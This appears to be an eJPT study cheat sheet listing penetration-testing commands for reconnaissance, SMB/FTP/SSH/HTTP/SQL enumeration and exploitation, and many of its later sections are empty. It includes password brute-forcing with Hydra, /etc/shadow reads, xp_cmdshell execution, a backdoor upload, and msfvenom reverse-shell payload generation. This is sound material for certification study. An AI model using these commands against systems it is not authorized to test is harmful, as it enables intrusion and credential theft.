# 📜eJPT Cheat Sheet

## [Networking](penetration-testing-prerequisites/networking.md)

```bash
# Routing

# Linux
ip route

# Windows
route print

# Mac OS X / Linux
netstat -r
```

```bash
# IP

# Linux
ip a
ip -br -c a

# Windows
ipconfig /all

# Mac OS X / Linux
ifconfig
```

```bash
# ARP

# Linux
ip neighbour

# Windows
arp -a

# Mac OS X / Linux
arp
```

```bash
# PORTS

# Linux
netstat -tunp
netstat -tulpn
ss -tnl

# Windows
netstat -ano

# Mac OS X / Linux
netstat -p tcp -p udp
lsof -n -i4TCP -i4UDP
```

```bash
# Connect
nc -v example.com 80

openssl s_client -connect <HOST>:<PORT>
openssl s_client -connect <HOST>:<PORT> -debug
openssl s_client -connect <HOST>:<PORT> -state
openssl s_client -connect <HOST>:<PORT> -quiet

# Scan port
nc -zv <HOST> <PORT>
```

## [Information Gathering](assessment-methodologies/1-info-gathering.md)

```bash
# Passive
host <HOST>
whatweb <HOST>
whois <HOST>
whois <IP>

dnsrecon -d <HOST>

wafw00f -l
wafw00f <HOST> -a

sublist3r -d <HOST>
theHarvester -d <HOST>
theHarvester -d <HOST> -b all
```

```bash
# Google Dorks
site:
inurl:
site:*.sitename.com
intitle:
filetype:
intitle:index of
cache:
inurl:auth_user_file.txt
inurl:passwd.txt
inurl:wp-config.bak
```

```bash
# DNS
sudo nano /etc/hosts
dnsenum <HOST>
# e.g. dnsenum zonetransfer.me

dig <HOST>
dig axfr @DNS-server-name <HOST>

fierce --domain <HOST>
```

```bash
# HOST DISCOVERY

## Ping scan
sudo nmap -sn <TARGET_IP/NETWORK>
## ARP scan
netdiscover -i eth1 -r <TARGET_IP/NETWORK>

# NMAP PORT SCAN
nmap <TARGET_IP>
## Skip ping
nmap -Pn <TARGET_IP>
## Scan all ports
nmap -p- <TARGET_IP>
## Port 80 only scan
nmap -p 80 <TARGET_IP>
## Custom list of ports scan
nmap -p 80,445,3389,8080 <TARGET_IP>
## Custom ports range scan
nmap -p1-2000 <TARGET_IP>
## Fast mode & verbose scan
nmap -F <TARGET_IP> -v
## UDP scan
nmap -sU <TARGET_IP>
## Service scan
nmap -sV <TARGET_IP>
## Service + O.S. detection scan
sudo nmap -sV -O <TARGET_IP>
## Default Scripts scan
nmap -sC <TARGET_IP>
nmap -Pn -F -sV -O -sC <TARGET_IP>
## Aggressive scan
nmap -Pn -F -A <TARGET_IP>
## Timing (T0=slow ... T5=insanely fast) scan
nmap -Pn -F -T5 -sV -O -sC <TARGET_IP> -v
## Output scan
nmap -Pn -F <TARGET_IP> -oN outputfile.txt
nmap -Pn -F <TARGET_IP> -oX outputfile.xml
```

## [Footprinting & Scanning](assessment-methodologies/2-footprint-scan.md)

```bash
# NETWORK DISCOVERY
sudo arp-scan -I eth1 <TARGET_IP/NETWORK>
ping <TARGET_IP>
sudo nmap -sn <TARGET_IP/NETWORK>

## fping
fping -I eth1 -g <TARGET_IP/NETWORK> -a
## fping with no "Host Unreachable errors"
fping -I eth1 -g <TARGET_IP/NETWORK> -a fping -I eth1 -g <TARGET_IP/NETWORK> -a 2>/dev/null
```

## [Enumeration](assessment-methodologies/3-enumeration.md)

### SMB

```bash
# NMAP
sudo nmap -p 445 -sV -sC -O <TARGET_IP>
nmap -sU --top-ports 25 --open <TARGET_IP>

nmap -p 445 --script smb-protocols <TARGET_IP>
nmap -p 445 --script smb-security-mode <TARGET_IP>

nmap -p 445 --script smb-enum-sessions <TARGET_IP>
nmap -p 445 --script smb-enum-sessions --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-shares <TARGET_IP>
nmap -p 445 --script smb-enum-shares --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-users --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-server-stats --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-domains--script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-groups--script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-services --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-shares,smb-ls --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-os-discovery <TARGET_IP>

nmblookup -A <TARGET_IP>
```

```bash
# SMBMAP
smbmap -u guest -p "" -d . -H <TARGET_IP>

smbmap -u <USER> -p '<PW>' -d . -H <TARGET_IP>

## Run a command
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -x 'ipconfig'
## List all drives
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -L
## List dir content
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -r 'C$'
## Upload a file
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --upload '/root/sample_backdoor' 'C$\sample_backdoor'
## Download a file
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --download 'C$\flag.txt'
```

```bash
# METASPLOIT
msfconsole
msfconsole -q

# METASPLOIT SMB
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_login
use auxiliary/scanner/smb/pipe_auditor

## set options depends on the selected module
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set SMBUser <USER>
set RHOSTS <TARGET_IP>
exploit
```

```bash
# SMB Connection
smbclient -L <TARGET_IP> -N
smbclient -L <TARGET_IP> -U <USER>
smbclient //<TARGET_IP>/<USER> -U <USER>
smbclient //<TARGET_IP>/admin -U admin
smbclient //<TARGET_IP>/public -N
## SMBCLIENT
help
ls
get <filename>

rpcclient -U "" -N <TARGET_IP>
## RPCCLIENT
enumdomusers
enumdomgroups
lookupnames admin
```

```bash
# ENUM4LINUX
enum4linux -o <TARGET_IP>
enum4linux -U <TARGET_IP>
enum4linux -S <TARGET_IP>
enum4linux -G <TARGET_IP>
enum4linux -i <TARGET_IP>
enum4linux -r -u "<USER>" -p "<PW>" <TARGET_IP>
```

```bash
# HYDRA
gzip -d /usr/share/wordlists/rockyou.txt.gz

hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> smb
```

### FTP

```bash
# NMAP
sudo nmap -p 21 -sV -sC -O <TARGET_IP>
nmap -p 21 -sV -O <TARGET_IP>

nmap -p 21 --script ftp-brute --script-args userdb=<USERS_LIST> <TARGET_IP>
nmap -p 21 --script ftp-anon <TARGET_IP>
nmap -p 21 --script ftp-brute --script-args userdb=<USERS_LIST> <TARGET_IP>
```

```bash
# FTP
ftp <TARGET_IP>
## FTP client
ls
get <filename>
```

```bash
# HYDRA
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <TARGET_IP> -t 4 ftp
```

### SSH

```bash
# NMAP
sudo nmap -p 22 -sV -sC -O <TARGET_IP>

nmap -p 22 --script ssh2-enum-algos <TARGET_IP>
nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full <TARGET_IP>
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=<USER>" <TARGET_IP>

nmap -p 22 --script=ssh-run --script-args="ssh-run.cmd=cat /home/student/FLAG, ssh-run.username=<USER>, ssh-run.password=<PW>" <TARGET_IP>

nmap -p 22 --script=ssh-brute --script-args userdb=<USERS_LIST> <TARGET_IP>
```

```bash
# NETCAT
nc <TARGET_IP> 22
```

```bash
# SSH
ssh <USER>@<TARGET_IP> 22
ssh root@<TARGET_IP> 22
```

```bash
# HYDRA
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> ssh
```

```bash
# METASPLOIT SSH
use auxiliary/scanner/ssh/ssh_login

set RHOSTS <TARGET_IP>
set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
set STOP_ON_SUCCESS true
set VERBOSE true
exploit
```

### HTTP

```bash
# NMAP
sudo nmap -p 80 -sV -O <TARGET_IP>

nmap -p 80 --script=http-enum -sV <TARGET_IP>
nmap -p 80 --script=http-headers -sV <TARGET_IP>
nmap -p 80 --script=http-methods --script-args http-methods.url-path=/webdav/ <TARGET_IP>
nmap -p 80 --script=http-webdav-scan --script-args http-methods.url-path=/webdav/ <TARGET_IP>
```

```bash
whatweb <TARGET_IP>
http <TARGET_IP>
browsh --startup-url http://<TARGET_IP>

dirb http://<TARGET_IP>
dirb http://<TARGET_IP> /usr/share/metasploit-framework/data/wordlists/directory.txt

wget <TARGET_IP>
curl <TARGET_IP> | more
curl -I http://<TARGET_IP>/<DIR>
curl --digest -u <USER>:<PW> http://<TARGET_IP>/<DIR>

lynx <TARGET_IP>
```

```bash
# METASPLOIT HTTP
use auxiliary/scanner/http/brute_dirs
use auxiliary/scanner/http/robots_txt
use auxiliary/scanner/http/http_header
use auxiliary/scanner/http/http_login
use auxiliary/scanner/http/http_version

# Global set
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

## set options depends on the selected module
set HTTP_METHOD GET
set TARGETURI /<DIR>/

set USER_FILE <USERS_LIST>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set AUTH_URI /<DIR>/
exploit
```

### SQL

```bash
# NMAP
sudo nmap -p 3306 -sV -O <TARGET_IP>

nmap -p 3306 --script=mysql-empty-password <TARGET_IP>
nmap -p 3306 --script=mysql-info <TARGET_IP>
nmap -p 3306 --script=mysql-users --script-args="mysqluser='<USER>',mysqlpass='<PW>'" <TARGET_IP>
nmap -p 3306 --script=mysql-databases --script-args="mysqluser='<USER>',mysqlpass='<PW>'" <TARGET_IP>
nmap -p 3306 --script=mysql-variables --script-args="mysqluser='<USER>',mysqlpass='<PW>'" <TARGET_IP>

nmap -p 3306 --script=mysql-audit --script-args="mysql-audit.username='<USER>',mysql-audit.password='<PW>',mysql-audit.filename=''" <TARGET_IP>

nmap -p 3306 --script=mysql-dump-hashes --script-args="username='<USER>',password='<PW>'" <TARGET_IP>

nmap -p 3306 --script=mysql-query --script-args="query='select count(*) from <DB_NAME>.<TABLE_NAME>;',username='<USER>',password='<PW>'" <TARGET_IP>

## Microsoft SQL
nmap -sV -sC -p 1433 <TARGET_IP>

nmap -p 1433 --script ms-sql-info <TARGET_IP>
nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 <TARGET_IP>
nmap -p 1433 --script ms-sql-empty-password <TARGET_IP>

nmap -p 3306 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt <TARGET_IP>

nmap -p 3306 --script ms-sql-query --script-args mssql.username=<USER>,mssql.password=<PW>,ms-sql-query.query="SELECT * FROM master..syslogins" <TARGET_IP> -oN output.txt

nmap -p 3306 --script ms-sql-dump-hashes --script-args mssql.username=<USER>,mssql.password=<PW> <TARGET_IP>

nmap -p 3306 --script ms-sql-xp-cmdshell --script-args mssql.username=<USER>,mssql.password=<PW>,ms-sql-xp-cmdshell.cmd="ipconfig" <TARGET_IP>

nmap -p 3306 --script ms-sql-xp-cmdshell --script-args mssql.username=<USER>,mssql.password=<PW>,ms-sql-xp-cmdshell.cmd="type c:\flag.txt" <TARGET_IP>
```

```bash
# MYSQL
mysql -h <TARGET_IP> -u <USER>
mysql -h <TARGET_IP> -u root

# Mysql client
help
show databases;
use <DB_NAME>;
select count(*) from <TABLE_NAME>;
select load_file("/etc/shadow");
```

```bash
# HYDRA
hydra -l <USER> -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <TARGET_IP> mysql
```

```bash
# METASPLOIT MYSQL
use auxiliary/scanner/mysql/mysql_schemadump
use auxiliary/scanner/mysql/mysql_writable_dirs
use auxiliary/scanner/mysql/mysql_file_enum
use auxiliary/scanner/mysql/mysql_hashdump
use auxiliary/scanner/mysql/mysql_login

## MS Sql
use auxiliary/scanner/mssql/mssql_login
use auxiliary/admin/mssql/mssql_enum
use auxiliary/admin/mssql/mssql_enum_sql_logins
use auxiliary/admin/mssql/mssql_exec
use auxiliary/admin/mssql/mssql_enum_domain_accounts

# Global set
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

## set options depends on the selected module
set USERNAME root
set PASSWORD ""

set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
set VERBOSE false
set PASSWORD ""

set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
set PASSWORD ""

set USER_FILE /root/Desktop/wordlist/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set STOP_ON_SUCCESS true

set CMD whoami
exploit
```

### SMTP

```bash
# NMAP
sudo nmap -p 25 -sV -sC -O <TARGET_IP>

nmap -sV -script banner <TARGET_IP>
```

```bash
nc <TARGET_IP> 25
telnet <TARGET_IP> 25

# TELNET client - check supported capabilities
HELO attacker.xyz
EHLO attacker.xyz
```

```bash
smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t <TARGET_IP>
```

```bash
# METASPLOIT
service postgresql start && msfconsole -q

# Global set
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

use auxiliary/scanner/smtp/smtp_enum
```

## [Vulnerability Assessment](assessment-methodologies/4-va.md)

```bash
# HEARTBLEED
nmap -sV --script ssl-enum-ciphers -p <SECURED_PORT> <TARGET>
nmap -sV --script ssl-heartbleed -p 443 <TARGET>

# ETERNALBLUE
nmap --script smb-vuln-ms17-010 -p 445 <TARGET>

# BLUEKEEP
msfconsole
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce

# LOG4J
nmap --script log4shell.nse --script-args log4shell.callback-server=<CALLBACK_SERVER_IP>:1389 -p 8080 <TARGET_HOST>
```

```bash
searchsploit badblue 2.7
```

## [Host Based Attacks](hostnetwork-penetration-testing/1-system-attack.md)

### Windows Exploitation

```bash
# IIS WEBDAV
davtest -url <URL>
cadaver [OPTIONS] <URL>
```

```bash
msfvenom -p <PAYLOAD> LHOST=<LOCAL_HOST_IP> LPORT=<PORT> -f <file_type> > shell.asp
```

```bash
# SMB

```

```bash
# RDP

```

```bash
# WINRM
crackmapexec [OPTIONS]
evil-winrm -i <IP> -u <USER> -p <PASSWORD>
```

### Windows Privilege Escalation

```bash
# WIN KERNEL
./windows-exploit-suggester.py --database YYYY-MM-DD-mssb.xlsx --systeminfo win7sp1-systeminfo.txt
```

```bash
# UAC - UACME
akagi32.exe [Key] [Param]
```

```bash
# ACCESS TOKEN IMPERSONATION

```

### Windows Credential Dumping

```bash
#

```

### Linux Exploitation

```bash
# BASH - APACHE

```

```bash
# FTP

```

```bash
# SSH

```

```bash
# SAMBA

```

### Linux Privilege Escalation

```bash
# LINUX KERNEL
./linux-exploit-suggester.sh
```

```bash
# CRON

```

```bash
# SUID

```

### Linux Credential Dumping

```bash
cat /etc/passwd
sudo cat /etc/shadow
```

## [Network Based Attacks](hostnetwork-penetration-testing/2-network-attack.md)

```bash
#
```

## [Metasploit](hostnetwork-penetration-testing/3-metasploit.md)

```bash
service postgresql start && msfconsole -q
```

### Info Gathering

```bash
#
```

### Enumeration

```bash
#
```

### Vulnerability Scanning

```bash
#
```

### Payloads

```bash
#
```

### Win Exploitation

```bash
#
```

### Linux Exploitation

```bash
#
```

### Win Post-Exploitation

```bash
#
```

### Linux Post-Exploitation

```bash
#
```

### Armitage

```bash
#
```

## [Exploitation](hostnetwork-penetration-testing/4-exploitation.md)

### Vulnerability Scanning

```bash
#
```

### Exploits

```bash
#
```

### Shells

```bash
#
```

### Frameworks

```bash
#
```

### Win Exploitation

```bash
#
```

### Linux Exploitation

```bash
#
```

### Obfuscation

```bash
#
```

## [Post-Exploitation](hostnetwork-penetration-testing/5-post-exploit.md)

### Win Local Enumeration

```bash
#
```

### Linux Local Enumeration

```bash
#
```

### Transferring Files

```bash
#
```

### Shells

```bash
#
```

### Win Privilege Escalation

```bash
#
```

### Linux Privilege Escalation

```bash
#
```

### Win Persistence

```bash
#
```

### Linux Persistence

```bash
#
```

### Dumping & Cracking

```bash
#
```

### Pivoting

```bash
#
```

### Clearing

```bash
#
```

## [Social Engineering](hostnetwork-penetration-testing/6-social-engineer.md)

```bash
#
```



## [Web Application Penetration Testing](webapp-penetration-testing/1-webapp-http.md)

```bash
#
```
